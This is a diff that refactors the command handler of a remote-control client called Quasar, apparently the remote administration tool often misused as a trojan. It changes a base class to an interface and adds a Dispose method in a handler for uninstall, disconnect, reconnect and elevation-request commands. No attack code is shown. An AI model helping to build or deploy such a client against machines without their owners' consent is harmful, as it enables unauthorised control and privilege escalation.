@@ -1,41 +1,40 @@
-﻿using System;
-using Quasar.Client.Config;
-using Quasar.Client.Helper;
+﻿using Quasar.Client.Config;
 using Quasar.Client.Networking;
 using Quasar.Client.Setup;
+using Quasar.Client.User;
 using Quasar.Client.Utilities;
+using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
+using System;
 using System.Diagnostics;
 using System.Windows.Forms;
-using Quasar.Client.User;
-using Quasar.Common.Enums;
 
 namespace Quasar.Client.Messages
 {
-    public class ClientServicesHandler : MessageProcessorBase<object>
+    public class ClientServicesHandler : IMessageProcessor
     {
         private readonly QuasarClient _client;
 
         private readonly QuasarApplication _application;
 
-        public ClientServicesHandler(QuasarApplication application, QuasarClient client) : base(false)
+        public ClientServicesHandler(QuasarApplication application, QuasarClient client)
         {
             _application = application;
             _client = client;
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is DoClientUninstall ||
+        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                              message is DoClientDisconnect ||
                                                              message is DoClientReconnect ||
                                                              message is DoAskElevate;
 
         /// <inheritdoc />
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
         /// <inheritdoc />
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -111,9 +110,18 @@ namespace Quasar.Client.Messages
             }
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
         {
-            
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+
         }
     }
 }
